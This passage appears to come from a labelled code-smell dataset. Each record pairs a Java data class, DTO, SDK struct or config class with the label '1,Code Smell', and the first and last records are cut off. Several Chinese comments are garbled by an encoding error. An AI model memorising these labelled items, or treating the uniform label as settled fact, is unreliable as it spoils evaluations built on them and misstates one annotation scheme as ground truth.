  public NET_DVR_UPLOAD_PLATE_INFO struUploadPlateInfo=new NET_DVR_UPLOAD_PLATE_INFO();
  public NET_DVR_SEND_CARD_INFO struSendCardInfo=new NET_DVR_SEND_CARD_INFO();
}",1,Code Smell
"@Component @ConfigurationProperties(prefix=""sip"",ignoreInvalidFields=true) @Order(0) public class SipConfig {
  private String ip;
  private String showIp;
  private Integer port;
  private String domain;
  private String id;
  private String password;
  Integer ptzSpeed=50;
  Integer registerTimeInterval=120;
  private boolean alarm;
  public void setIp(  String ip){
    this.ip=ip;
  }
  public void setPort(  Integer port){
    this.port=port;
  }
  public void setDomain(  String domain){
    this.domain=domain;
  }
  public void setId(  String id){
    this.id=id;
  }
  public void setPassword(  String password){
    this.password=password;
  }
  public void setPtzSpeed(  Integer ptzSpeed){
    this.ptzSpeed=ptzSpeed;
  }
  public void setRegisterTimeInterval(  Integer registerTimeInterval){
    this.registerTimeInterval=registerTimeInterval;
  }
  public String getIp(){
    return ip;
  }
  public Integer getPort(){
    return port;
  }
  public String getDomain(){
    return domain;
  }
  public String getId(){
    return id;
  }
  public String getPassword(){
    return password;
  }
  public Integer getPtzSpeed(){
    return ptzSpeed;
  }
  public Integer getRegisterTimeInterval(){
    return registerTimeInterval;
  }
  public boolean isAlarm(){
    return alarm;
  }
  public void setAlarm(  boolean alarm){
    this.alarm=alarm;
  }
  public String getShowIp(){
    if (this.showIp == null) {
      return this.ip;
    }
    return showIp;
  }
  public void setShowIp(  String showIp){
    this.showIp=showIp;
  }
}",1,Code Smell
"protected static class MoveInfo {
  public RecyclerView.ViewHolder holder;
  public int fromX, fromY, toX, toY;
  public MoveInfo(  RecyclerView.ViewHolder holder,  int fromX,  int fromY,  int toX,  int toY){
    this.holder=holder;
    this.fromX=fromX;
    this.fromY=fromY;
    this.toX=toX;
    this.toY=toY;
  }
}
",1,Code Smell
"@JSONType(deserializeFeatures=JSONReader.Feature.SupportSmartMatch) public class LongValueField10 {
  public long v0000;
  public long v0001;
  public long v0002;
  public long v0003;
  public long v0004;
  public long v0005;
  public long v0006;
  public long v0007;
  public long v0008;
  public long v0009;
}",1,Code Smell
"public static class EM_TROUSERS_TYPE extends SdkStructure {
  public static final int EM_TROUSERS_TYPE_UNKNOWN=0;
  public static final int EM_TROUSERS_TYPE_TROUSERS=1;
  public static final int EM_TROUSERS_TYPE_SHORTS=2;
  public static final int EM_TROUSERS_TYPE_SKIRT=3;
}",1,Code Smell
"public static class NET_DVR_ARRAY_INFO extends Structure {
  public short wArrayID;
  public byte byRaidMode;
  public byte byStatus;
  public int dwHCapacity;
  public int dwLCapacity;
  public int dwHFreeSpace;
  public int dwLFreeSpace;
  public byte[] byArrayName=new byte[MAX_NAMELEN];
  public byte byPDCount;
  public byte bySpareCount;
  public byte[] byRes1=new byte[2];
  public short[] wPDSlots=new short[SUPPORT_PD_NUM];
  public short[] wSparePDSlots=new short[SUPPORT_PD_NUM];
  public NET_DVR_BGA_INFO struBgaInfo;
  public short[] wPDSlotsPartTwo=new short[SUPPORT_PD_NUM_PARTTWO];
  public short[] wSparePDSlotsPartTwo=new short[SUPPORT_PD_NUM_PARTTWO];
  public byte[] byRes2=new byte[48];
}",1,Code Smell
"@Table(""tb_account"") public class TenantAccount {
  @Id(keyType=KeyType.Auto) private Long id;
  @ColumnMask(Masks.CHINESE_NAME) private String userName;
  private int age;
  private Date birthday;
  @Column(tenantId=true) private Long tenantId;
  public Long getId(){
    return id;
  }
  public void setId(  Long id){
    this.id=id;
  }
  public String getUserName(){
    return userName;
  }
  public void setUserName(  String userName){
    this.userName=userName;
  }
  public int getAge(){
    return age;
  }
  public void setAge(  int age){
    this.age=age;
  }
  public Date getBirthday(){
    return birthday;
  }
  public void setBirthday(  Date birthday){
    this.birthday=birthday;
  }
  public Long getTenantId(){
    return tenantId;
  }
  public void setTenantId(  Long tenantId){
    this.tenantId=tenantId;
  }
  @Override public String toString(){
    return ""TenantAccount{"" + ""id="" + id + "", userName='""+ userName+ '\''+ "", age=""+ age+ "", birthday=""+ birthday+ "", tenantId=""+ tenantId+ '}';
  }
}
",1,Code Smell
"public final class VASMsgFont {
  Integer diyFontCfgUpdateTime;
  Integer diyFontImageId;
  Integer fontId;
  Integer magicFontType;
  Long subFontId;
  public VASMsgFont(){
  }
  public Integer getDiyFontCfgUpdateTime(){
    return this.diyFontCfgUpdateTime;
  }
  public Integer getDiyFontImageId(){
    return this.diyFontImageId;
  }
  public Integer getFontId(){
    return this.fontId;
  }
  public Integer getMagicFontType(){
    return this.magicFontType;
  }
  public Long getSubFontId(){
    return this.subFontId;
  }
  public String toString(){
    return ""VASMsgFont{fontId="" + this.fontId + "",subFontId=""+ this.subFontId+ "",diyFontCfgUpdateTime=""+ this.diyFontCfgUpdateTime+ "",diyFontImageId=""+ this.diyFontImageId+ "",magicFontType=""+ this.magicFontType+ "",}"";
  }
  public VASMsgFont(  Integer num,  Long l2,  Integer num2,  Integer num3,  Integer num4){
    this.fontId=num;
    this.subFontId=l2;
    this.diyFontCfgUpdateTime=num2;
    this.diyFontImageId=num3;
    this.magicFontType=num4;
  }
}",1,Code Smell
"/** 
 * 杞挱鍥�
 * @author YXF
 * @date 2020-11-24 16:38:32
 */
public class IndexImg extends BaseModel implements Serializable {
  private static final long serialVersionUID=1L;
  /** 
 * 涓婚敭
 */
  private Long imgId;
  /** 
 * 搴楅摵ID
 */
  private Long shopId;
  /** 
 * 鍥剧墖
 */
  private String imgUrl;
  /** 
 * 鐘舵��
 */
  private Integer status;
  /** 
 * 椤哄簭
 */
  private Integer seq;
  /** 
 * 鍏宠仈鍟嗗搧id
 */
  private Long spuId;
  /** 
 * 鍥剧墖绫诲瀷 0:灏忕▼搴� 1:pc
 */
  private Integer imgType;
  public Long getImgId(){
    return imgId;
  }
  public void setImgId(  Long imgId){
    this.imgId=imgId;
  }
  public Long getShopId(){
    return shopId;
  }
  public void setShopId(  Long shopId){
    this.shopId=shopId;
  }
  public String getImgUrl(){
    return imgUrl;
  }
  public void setImgUrl(  String imgUrl){
    this.imgUrl=imgUrl;
  }
  public Integer getStatus(){
    return status;
  }
  public void setStatus(  Integer status){
    this.status=status;
  }
  public Integer getSeq(){
    return seq;
  }
  public void setSeq(  Integer seq){
    this.seq=seq;
  }
  public Long getSpuId(){
    return spuId;
  }
  public void setSpuId(  Long spuId){
    this.spuId=spuId;
  }
  public Integer getImgType(){
    return imgType;
  }
  public void setImgType(  Integer imgType){
    this.imgType=imgType;
  }
  @Override public String toString(){
    return ""IndexImg{"" + ""imgId="" + imgId + "",shopId=""+ shopId+ "",imgUrl=""+ imgUrl+ "",status=""+ status+ "",seq=""+ seq+ "",spuId=""+ spuId+ "",imgType=""+ imgType+ "",createTime=""+ createTime+ "",updateTime=""+ updateTime+ '}';
  }
}",1,Code Smell
"public class BaseEntity implements Serializable {
  @TableId(value=""id"",type=IdType.AUTO) private Long id=0L;
  @TableField(value=""gmt_create"",fill=FieldFill.INSERT) private Timestamp gmtCreate;
  @TableField(fill=FieldFill.INSERT_UPDATE,update=""now()"",value=""gmt_modified"") private Timestamp gmtModified;
  private Integer isDeleted=0;
  public Long getId(){
    return id;
  }
  public void setId(  Long id){
    this.id=id;
  }
  public Timestamp getGmtCreate(){
    return gmtCreate;
  }
  public void setGmtCreate(  Timestamp gmtCreate){
    this.gmtCreate=gmtCreate;
  }
  public Timestamp getGmtModified(){
    return gmtModified;
  }
  public void setGmtModified(  Timestamp gmtModified){
    this.gmtModified=gmtModified;
  }
  public Integer getIsDeleted(){
    return isDeleted;
  }
  public void setIsDeleted(  Integer isDeleted){
    this.isDeleted=isDeleted;
  }
}",1,Code Smell
"public static class NET_SATELLITE_STATUS extends SdkStructure {
  public int bUsed;
  public int nID;
  public int nElevation;
  public int nDireciton;
  public int nSNR;
}
",1,Code Smell
"@JsonInclude(Include.NON_NULL) public class KafkaRecord {
  private String topic;
  private Integer partition;
  private Long timestamp;
  private TimestampType timestampType;
  private Long offset;
  private String key;
  private String value;
  public String getTopic(){
    return topic;
  }
  public void setTopic(  String topic){
    this.topic=topic;
  }
  public Integer getPartition(){
    return partition;
  }
  public void setPartition(  Integer partition){
    this.partition=partition;
  }
  public Long getTimestamp(){
    return timestamp;
  }
  public void setTimestamp(  Long timestamp){
    this.timestamp=timestamp;
  }
  public TimestampType getTimestampType(){
    return timestampType;
  }
  public void setTimestampType(  TimestampType timestampType){
    this.timestampType=timestampType;
  }
  public Long getOffset(){
    return offset;
  }
  public void setOffset(  Long offset){
    this.offset=offset;
  }
  public String getKey(){
    return key;
  }
  public void setKey(  String key){
    this.key=key;
  }
  public String getValue(){
    return value;
  }
  public void setValue(  String value){
    this.value=value;
  }
}
",1,Code Smell
"public class CVE {
  @SerializedName(""CVE_data_meta"") private CveMetaData cveMetaData;
  @Expose private References references;
  @Expose private Description description;
  @SerializedName(""problemtype"") private ProblemType problemType;
  public References getReferences(){
    return this.references;
  }
  public Description getDescription(){
    return this.description;
  }
  public ProblemType getProblemType(){
    return this.problemType;
  }
  public CveMetaData getCveMetaData(){
    return this.cveMetaData;
  }
}
",1,Code Smell
"private static class MessageContext {
  public final TGMessage message;
  public final Object tag;
  public final TdApi.ChatMember messageSender;
  public final boolean disableMetadata;
  public MessageContext(  TGMessage message){
    this(message,null,null,false);
  }
  public MessageContext(  TGMessage message,  Object tag,  TdApi.ChatMember messageSender,  boolean disableMetadata){
    this.message=message;
    this.tag=tag;
    this.messageSender=messageSender;
    this.disableMetadata=disableMetadata;
  }
}
",1,Code Smell
"/** 
 * @author vainhope
 */
public class RenderCondition {
  private String key;
  private int value;
  private String renderKind;
  public void setKey(  String key){
    this.key=key;
  }
  public String getKey(){
    return key;
  }
  public void setValue(  int value){
    this.value=value;
  }
  public int getValue(){
    return value;
  }
  public void setRenderKind(  String renderKind){
    this.renderKind=renderKind;
  }
  public String getRenderKind(){
    return renderKind;
  }
}
",1,Code Smell
"/** 
 * harris
 */
public class K8sResource {
  private List<Node> children;
  private String name;
  private String k8sId;
  public List<Node> getChildren(){
    return children;
  }
  public void setChildren(  List<Node> children){
    this.children=children;
  }
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public String getK8sId(){
    return k8sId;
  }
  public void setK8sId(  String k8sId){
    this.k8sId=k8sId;
  }
}",1,Code Smell
"static class Model<T> {
  private String name;
  @JSONField(serializeUsing=MyCodec.class,deserializeUsing=MyCodec.class) private T properties;
  Model(){
  }
  Model(  String name,  T properties){
    this.name=name;
    this.properties=properties;
  }
  public String getName(){
    return this.name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public T getProperties(){
    return this.properties;
  }
  public void setProperties(  T properties){
    this.properties=properties;
  }
}
",1,Code Smell
"public static class TcpHealthParams implements HealthParams {
  private int max=5000;
  private int min=1000;
  private float factor=0.75F;
  @Override public int getMax(){
    return max;
  }
  @Override public int getMin(){
    return min;
  }
  @Override public float getFactor(){
    return factor;
  }
  public void setFactor(  float factor){
    this.factor=factor;
  }
  public void setMax(  int max){
    this.max=max;
  }
  public void setMin(  int min){
    this.min=min;
  }
}",1,Code Smell
"public static class NET_ITC_LANE_HVT_PARAM extends Structure {
  public byte byLaneNO;
  public byte bySignSpeed;
  public byte bySpeedLimit;
  public byte byBigCarSignSpeed;
  public byte byBigCarSpeedLimit;
  public byte bySpeedCapEn;
  public byte byCaptureCount;
  public byte byRelatedIOOut;
  public byte byFlashMode;
  public byte byEnableRadar;
  public byte byChangeLaneEnable;
  public byte byChangeLaneCapNo;
  public int dwCapTarget;
  public NET_ITC_INTERVAL_PARAM struInterval;
  public byte[] byRes3=new byte[24];
  public NET_ITC_LANE_LOGIC_PARAM struLane;
  public NET_ITC_LINE struLeftLaneLine;
  public NET_ITC_LINE struRightLaneLine;
  public NET_ITC_POLYGON struPlateRecog;
  public NET_ITC_POLYGON struTraceArea;
  public NET_VCA_LINE struForwardTrigLine;
  public NET_VCA_LINE struBackwardTrigLine;
  public NET_VCA_LINE struLeftTrigLine;
  public NET_VCA_LINE struRightTrigLine;
  public byte[] byRes4=new byte[60];
}",1,Code Smell
"public static class NET_OUT_GET_ALL_PROGRAMMEPLANS extends SdkStructure {
  public int dwSize;
  public int nMaxPlanCnt;
  public int nRetImmCnt;
  public Pointer pstImmePlan;
  public int nRetTimerCnt;
  public Pointer pstTimerPlan;
  public NET_OUT_GET_ALL_PROGRAMMEPLANS(){
    this.dwSize=this.size();
  }
}
",1,Code Smell
"public static class EM_FEATURE_ERROR_CODE {
  public final static int EM_FEATURE_ERROR_SUCCESS=0;
  public final static int EM_FEATURE_ERROR_UNKNOWN=1;
  public final static int EM_FEATURE_ERROR_IMAGE_FORMAT_ERROR=2;
  public final static int EM_FEATURE_ERROR_NOFACE_OR_NOTCLEAR=3;
  public final static int EM_FEATURE_ERROR_MULT_FACES=4;
  public final static int EM_FEATURE_ERROR_IMAGH_DECODE_FAILED=5;
  public final static int EM_FEATURE_ERROR_NOT_SUGGEST_STORAGE=6;
  public final static int EM_FEATURE_ERROR_DATABASE_OPERATE_FAILED=7;
  public final static int EM_FEATURE_ERROR_GET_IMAGE_FAILED=8;
  public final static int EM_FEATURE_ERROR_SYSTEM_EXCEPTION=9;
}",1,Code Smell
"public class AtomicIntegerArray3 {
  private AtomicIntegerArray v0000;
  private AtomicIntegerArray v0001;
  private AtomicIntegerArray v0002;
  public AtomicIntegerArray getV0000(){
    return v0000;
  }
  public void setV0000(  AtomicIntegerArray v0000){
    this.v0000=v0000;
  }
  public AtomicIntegerArray getV0001(){
    return v0001;
  }
  public void setV0001(  AtomicIntegerArray v0001){
    this.v0001=v0001;
  }
  public AtomicIntegerArray getV0002(){
    return v0002;
  }
  public void setV0002(  AtomicIntegerArray v0002){
    this.v0002=v0002;
  }
}",1,Code Smell
"public final class AuthorIncomeDetailDynamicSqlSupport {
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final AuthorIncomeDetail authorIncomeDetail=new AuthorIncomeDetail();
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final SqlColumn<Long> id=authorIncomeDetail.id;
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final SqlColumn<Long> userId=authorIncomeDetail.userId;
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final SqlColumn<Long> authorId=authorIncomeDetail.authorId;
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final SqlColumn<Long> bookId=authorIncomeDetail.bookId;
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final SqlColumn<Date> incomeDate=authorIncomeDetail.incomeDate;
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final SqlColumn<Integer> incomeAccount=authorIncomeDetail.incomeAccount;
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final SqlColumn<Integer> incomeCount=authorIncomeDetail.incomeCount;
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final SqlColumn<Integer> incomeNumber=authorIncomeDetail.incomeNumber;
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final SqlColumn<Date> createTime=authorIncomeDetail.createTime;
@Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final class AuthorIncomeDetail extends SqlTable {
    public final SqlColumn<Long> id=column(""id"",JDBCType.BIGINT);
    public final SqlColumn<Long> userId=column(""user_id"",JDBCType.BIGINT);
    public final SqlColumn<Long> authorId=column(""author_id"",JDBCType.BIGINT);
    public final SqlColumn<Long> bookId=column(""book_id"",JDBCType.BIGINT);
    public final SqlColumn<Date> incomeDate=column(""income_date"",JDBCType.DATE);
    public final SqlColumn<Integer> incomeAccount=column(""income_account"",JDBCType.INTEGER);
    public final SqlColumn<Integer> incomeCount=column(""income_count"",JDBCType.INTEGER);
    public final SqlColumn<Integer> incomeNumber=column(""income_number"",JDBCType.INTEGER);
    public final SqlColumn<Date> createTime=column(""create_time"",JDBCType.TIMESTAMP);
    public AuthorIncomeDetail(){
      super(""author_income_detail"");
    }
  }
}
",1,Code Smell
"public static class EM_FACEINFO_OPREATE_TYPE extends SdkStructure {
  public static final int EM_FACEINFO_OPREATE_ADD=0;
  public static final int EM_FACEINFO_OPREATE_GET=1;
  public static final int EM_FACEINFO_OPREATE_UPDATE=2;
  public static final int EM_FACEINFO_OPREATE_REMOVE=3;
  public static final int EM_FACEINFO_OPREATE_CLEAR=4;
  public static final int EM_FACEINFO_OPREATE_GETFACEEIGEN=5;
}",1,Code Smell
"public static class NET_CODEID_INFO extends SdkStructure {
  public int dwSize;
  public long nWirelessId;
  public int emType;
  public byte[] szName=new byte[NET_USER_NAME_LENGTH];
  public int bEnable;
  public byte[] szCustomName=new byte[NET_COMMON_STRING_64];
  public int nChannel;
  public int emMode;
  public int emSenseMethod;
  public byte[] szSerialNumber=new byte[NET_WIRELESS_DEVICE_SERIAL_NUMBER_MAX_LEN];
  public int nTaskID;
  public byte[] szRoomNo=new byte[64];
  public int nMaxFingerprints;
  public int nMaxCards;
  public int nMaxPwd;
  public NET_CODEID_INFO(){
    this.dwSize=this.size();
  }
}",1,Code Smell
"/** 
 * company: www.dtstack.com author: toutian create: 2017/5/4
 */
public class Catalogue extends TenantEntity {
  /** 
 * 鏂囦欢澶瑰悕
 */
  private String nodeName;
  /** 
 * 鐖舵枃浠跺す
 */
  private Long nodePid;
  /** 
 * 鍒涘缓鐢ㄦ埛
 */
  private Long createUserId;
  /** 
 * 鐩綍灞傜骇
 */
  private Integer level;
  private Integer orderVal;
  private Integer catalogueType;
  public String getNodeName(){
    return nodeName;
  }
  public void setNodeName(  String nodeName){
    this.nodeName=nodeName;
  }
  public Long getNodePid(){
    return nodePid;
  }
  public void setNodePid(  Long nodePid){
    this.nodePid=nodePid;
  }
  public Long getCreateUserId(){
    return createUserId;
  }
  public void setCreateUserId(  Long createUserId){
    this.createUserId=createUserId;
  }
  public Integer getLevel(){
    return level;
  }
  public void setLevel(  Integer level){
    this.level=level;
  }
  public Integer getOrderVal(){
    return orderVal;
  }
  public void setOrderVal(  Integer orderVal){
    this.orderVal=orderVal;
  }
  public Integer getCatalogueType(){
    return catalogueType;
  }
  public void setCatalogueType(  Integer catalogueType){
    this.catalogueType=catalogueType;
  }
}",1,Code Smell
"public static class NET_ALARM_TYPE {
  public static final int NET_ALARM_LOCAL=0;
  public static final int NET_ALARM_ALARMEXTENDED=1;
  public static final int NET_ALARM_TEMP=2;
  public static final int NET_ALARM_URGENCY=3;
  public static final int NET_ALARM_RCEMERGENCYCALL=4;
  public static final int NET_ALARM_ALL=5;
}",1,Code Smell
"/** 
 * 鏂囨湰瀵煎嚭銆 <p> 瀵煎嚭涓烘枃鏈紝姣斿锛欳SV銆丣SON銆丒XCEL銆丼QL绛夈 </p>
 * @author datagear@163.com
 */
public abstract class TextDataExport extends FormatDataExchange {
  private TextDataExportOption exportOption;
  private TextDataExportListener listener;
  public TextDataExport(){
    super();
  }
  public TextDataExport(  ConnectionFactory connectionFactory,  DataFormat dataFormat,  TextDataExportOption exportOption){
    super(connectionFactory,dataFormat);
    this.exportOption=exportOption;
  }
  public TextDataExportOption getExportOption(){
    return exportOption;
  }
  public void setExportOption(  TextDataExportOption exportOption){
    this.exportOption=exportOption;
  }
  @Override public TextDataExportListener getListener(){
    return listener;
  }
  public void setListener(  TextDataExportListener listener){
    this.listener=listener;
  }
}",1,Code Smell
"public static class GetSpaceRspBody extends MessageMicro<GetSpaceRspBody> {
  public final PBInt32Field int32_ret_code=PBField.initInt32(0);
  public final PBStringField str_ret_msg=PBField.initString("""");
  public final PBStringField str_client_wording=PBField.initString("""");
  public final PBUInt64Field uint64_total_space=PBField.initUInt64(0);
  public final PBUInt64Field uint64_used_space=PBField.initUInt64(0);
  public final PBBoolField bool_all_upload=PBField.initBool(false);
}",1,Code Smell
"/** 
 * 椹卞姩搴撲俊鎭
 * @author datagear@163.com
 */
public class DriverLibraryInfo implements Serializable {
  private static final long serialVersionUID=1L;
  /** 
 * 搴撳悕绉 
 */
  private String name;
  /** 
 * 搴撳瓧鑺傛暟澶у皬 
 */
  private long size;
  public DriverLibraryInfo(){
    super();
  }
  public DriverLibraryInfo(  String name,  long size){
    super();
    this.name=name;
    this.size=size;
  }
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public long getSize(){
    return size;
  }
  public void setSize(  long size){
    this.size=size;
  }
  @Override public String toString(){
    return getClass().getSimpleName() + "" [name="" + name+ "", size=""+ size+ ""]"";
  }
}",1,Code Smell
"/** 
 * @author yasin.kalafat
 */
@Configuration public class PhoneHomeConfig {
  @Value(""${phonehome.url:}"") private String phoneHomeUrl;
  @Value(""${phonehome.enabled:true}"") private boolean phoneHomeEnabled;
  @Value(""${phonehome.statistics.enabled:true}"") private boolean phoneHomeStatisticsEnabled;
  @Value(""${phonehome.statistics.threadcount:5}"") private int phoneHomeStatisticsThreadCount;
  public String getPhoneHomeUrl(){
    return phoneHomeUrl;
  }
  public boolean isPhoneHomeEnabled(){
    return phoneHomeEnabled;
  }
  public boolean isPhoneHomeStatisticsEnabled(){
    return phoneHomeStatisticsEnabled;
  }
  public int getPhoneHomeStatisticsThreadCount(){
    return phoneHomeStatisticsThreadCount;
  }
}",1,Code Smell
"public class Mail {
  private String to;
  private String subject;
  private String content;
  private String filePath;
  public String getTo(){
    return to;
  }
  public void setTo(  String to){
    this.to=to;
  }
  public String getSubject(){
    return subject;
  }
  public void setSubject(  String subject){
    this.subject=subject;
  }
  public String getContent(){
    return content;
  }
  public void setContent(  String content){
    this.content=content;
  }
  public String getFilePath(){
    return filePath;
  }
  public void setFilePath(  String filePath){
    this.filePath=filePath;
  }
}
",1,Code Smell
"public final class GroupHonor {
  ArrayList<Integer> honorIds;
  Integer level;
  Integer oldLevel;
  Long rankSeq;
  Integer richFlag;
  Integer titleId;
  String uniqueTitle;
  public GroupHonor(){
  }
  public ArrayList<Integer> getHonorIds(){
    return this.honorIds;
  }
  public Integer getLevel(){
    return this.level;
  }
  public Integer getOldLevel(){
    return this.oldLevel;
  }
  public Long getRankSeq(){
    return this.rankSeq;
  }
  public Integer getRichFlag(){
    return this.richFlag;
  }
  public Integer getTitleId(){
    return this.titleId;
  }
  public String getUniqueTitle(){
    return this.uniqueTitle;
  }
  public String toString(){
    return ""GroupHonor{richFlag="" + this.richFlag + "",honorIds=""+ this.honorIds+ "",level=""+ this.level+ "",oldLevel=""+ this.oldLevel+ "",rankSeq=""+ this.rankSeq+ "",titleId=""+ this.titleId+ "",uniqueTitle=""+ this.uniqueTitle+ "",}"";
  }
  public GroupHonor(  Integer num,  ArrayList<Integer> arrayList,  Integer num2,  Integer num3,  Long l2,  Integer num4,  String str){
    this.richFlag=num;
    this.honorIds=arrayList;
    this.level=num2;
    this.oldLevel=num3;
    this.rankSeq=l2;
    this.titleId=num4;
    this.uniqueTitle=str;
  }
}",1,Code Smell
"public static class NET_DVR_PTZCFG extends Structure {
  public int dwSize;
  public NET_DVR_PTZ_PROTOCOL[] struPtz=new NET_DVR_PTZ_PROTOCOL[PTZ_PROTOCOL_NUM];
  public int dwPtzNum;
  public byte[] byRes=new byte[8];
}",1,Code Smell
"public static class NET_REMOTE_REALTIME_STREAM_INFO extends SdkStructure {
  public int dwSize;
  public int emStartRule;
  public NET_ANALYSE_RULE stuRuleInfo;
  public int emStreamProtocolType;
  public byte[] szPath=new byte[NET_COMMON_STRING_256];
  public byte[] szIp=new byte[NET_MAX_IPADDR_OR_DOMAIN_LEN];
  public short wPort;
  public byte[] byReserved=new byte[2];
  public byte[] szUser=new byte[NET_COMMON_STRING_64];
  public byte[] szPwd=new byte[NET_COMMON_STRING_64];
  public int nChannelID;
  public int nStreamType;
  public byte[] szTaskUserData=new byte[256];
  public NET_REMOTE_REALTIME_STREAM_INFO(){
    this.dwSize=this.size();
  }
}",1,Code Smell
"public static class NET_OUT_ACCESS_CARD_SERVICE_INSERT extends SdkStructure {
  public int dwSize;
  public int nMaxRetNum;
  public Pointer pFailCode;
  public byte[] byReserved=new byte[4];
  public NET_OUT_ACCESS_CARD_SERVICE_INSERT(){
    this.dwSize=this.size();
  }
}",1,Code Smell
"public final class GProGuildBottomTabExpData {
  long expId;
  String expIndex;
  boolean isHit;
  int tabType;
  public GProGuildBottomTabExpData(){
    this.expIndex="""";
  }
  public long getExpId(){
    return this.expId;
  }
  public String getExpIndex(){
    return this.expIndex;
  }
  public boolean getIsHit(){
    return this.isHit;
  }
  public int getTabType(){
    return this.tabType;
  }
  public String toString(){
    return ""GProGuildBottomTabExpData{isHit="" + this.isHit + "",expId=""+ this.expId+ "",expIndex=""+ this.expIndex+ "",tabType=""+ this.tabType+ "",}"";
  }
  public GProGuildBottomTabExpData(  boolean z,  long j2,  String str,  int i2){
    this.expIndex="""";
    this.isHit=z;
    this.expId=j2;
    this.expIndex=str;
    this.tabType=i2;
  }
}",1,Code Smell
"public static class NET_SCADA_ID_THRESHOLD_INFO extends SdkStructure {
  public int dwSize;
  public int emPointType;
  public byte[] szID=new byte[NET_COMMON_STRING_32];
  public float fThreshold;
  public float fAbsoluteValue;
  public float fRelativeValue;
  public int nStatus;
  public NET_SCADA_ID_THRESHOLD_INFO(){
    this.dwSize=this.size();
  }
}",1,Code Smell
"public static class DEV_EVENT_FIREWARNING_INFO extends SdkStructure {
  public int nChannelID;
  public byte[] szName=new byte[NET_EVENT_NAME_LEN];
  public NET_EVENT_FILE_INFO stuFileInfo;
  public int nAction;
  public int nFSID;
  public int emPicType;
  public byte[] byReserved=new byte[1016];
}",1,Code Smell
"/** 
 * XSS璺ㄧ珯鑴氭湰閰嶇疆
 * @author ruoyi
 */
@Configuration @RefreshScope @ConfigurationProperties(prefix=""security.xss"") public class XssProperties {
  /** 
 * Xss寮�鍏�
 */
  private Boolean enabled;
  /** 
 * 鎺掗櫎璺緞
 */
  private List<String> excludeUrls=new ArrayList<>();
  public Boolean getEnabled(){
    return enabled;
  }
  public void setEnabled(  Boolean enabled){
    this.enabled=enabled;
  }
  public List<String> getExcludeUrls(){
    return excludeUrls;
  }
  public void setExcludeUrls(  List<String> excludeUrls){
    this.excludeUrls=excludeUrls;
  }
}
",1,Code Smell
"public static class EmojiPack {
  public int index;
  public TLRPC.StickerSet set;
  public ArrayList<TLRPC.Document> documents=new ArrayList<>();
  public boolean free;
  public boolean installed;
  public boolean featured;
  public boolean expanded;
}
",1,Code Smell
"public class CodeVo extends Code {
  private Boolean favour;
  private String type;
  public Boolean getFavour(){
    return favour;
  }
  public void setFavour(  Boolean favour){
    this.favour=favour;
  }
  public String getType(){
    return type;
  }
  public void setType(  String type){
    this.type=type;
  }
}
",1,Code Smell
"public class Signal extends RootElement {
  private String name;
  private String structureRef;
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public String getStructureRef(){
    return structureRef;
  }
  public void setStructureRef(  String structureRef){
    this.structureRef=structureRef;
  }
}
",1,Code Smell
"public static class DEV_EVENT_LANEDEPARTURE_WARNNING_INFO extends SdkStructure {
  public int nChannelID;
  public int nEventID;
  public byte[] szName=new byte[NET_EVENT_NAME_LEN];
  public double PTS;
  public NET_TIME_EX UTC;
  public int nAction;
  public NET_GPS_STATUS_INFO stuGPSStatusInfo;
  public byte[] byReserved=new byte[1024];
}",1,Code Smell
"/** 
 * @author maguohao
 */
public class CreateRuleRequest extends Rule {
  private List<String> tags;
  private List<String> ruleSets;
  private List<String> inspectionSeports;
  private List<String> types;
  private String tagKey;
  private String resourceType;
  private String type;
  private Map<String,Object> combine;
  public List<String> getTags(){
    return tags;
  }
  public void setTags(  List<String> tags){
    this.tags=tags;
  }
  public List<String> getRuleSets(){
    return ruleSets;
  }
  public void setRuleSets(  List<String> ruleSets){
    this.ruleSets=ruleSets;
  }
  public List<String> getInspectionSeports(){
    return inspectionSeports;
  }
  public void setInspectionSeports(  List<String> inspectionSeports){
    this.inspectionSeports=inspectionSeports;
  }
  public List<String> getTypes(){
    return types;
  }
  public void setTypes(  List<String> types){
    this.types=types;
  }
  public String getTagKey(){
    return tagKey;
  }
  public void setTagKey(  String tagKey){
    this.tagKey=tagKey;
  }
  public String getResourceType(){
    return resourceType;
  }
  public void setResourceType(  String resourceType){
    this.resourceType=resourceType;
  }
  public String getType(){
    return type;
  }
  public void setType(  String type){
    this.type=type;
  }
  public Map<String,Object> getCombine(){
    return combine;
  }
  public void setCombine(  Map<String,Object> combine){
    this.combine=combine;
  }
}
",1,Code Smell
"public static final class ReqBody extends MessageMicro<ReqBody> {
  public final PBUInt64Field uint64_group_code=PBField.initUInt64(0);
  public final PBUInt32Field uint32_show_flag=PBField.initUInt32(0);
  public final PBRepeatMessageField<MemberInfo> rpt_mem_level_info=PBField.initRepeatMessage(MemberInfo.class);
  public final PBRepeatMessageField<LevelName> rpt_level_name=PBField.initRepeatMessage(LevelName.class);
  public final PBUInt32Field uint32_update_time=PBField.initUInt32(0);
  public final PBUInt32Field uint32_office_mode=PBField.initUInt32(0);
  public final PBUInt32Field uint32_group_open_appid=PBField.initUInt32(0);
  public ClientInfo msg_client_info=new ClientInfo();
  public final PBBytesField bytes_auth_key=PBField.initBytes(ByteStringMicro.EMPTY);
  public final PBRepeatMessageField<LevelName> rpt_level_name_new=PBField.initRepeatMessage(LevelName.class);
}",1,Code Smell
"@VisibleForTesting public static class CandidateContext {
  private Statistics mvStatistics;
  private int schemaColumnNum;
  private int groupbyColumnNum;
  private int index;
  public CandidateContext(  Statistics mvStatistics,  int schemaColumnNum){
    this(mvStatistics,schemaColumnNum,0);
  }
  public CandidateContext(  Statistics mvStatistics,  int schemaColumnNum,  int index){
    this.mvStatistics=mvStatistics;
    this.schemaColumnNum=schemaColumnNum;
    this.index=index;
    this.groupbyColumnNum=Integer.MAX_VALUE;
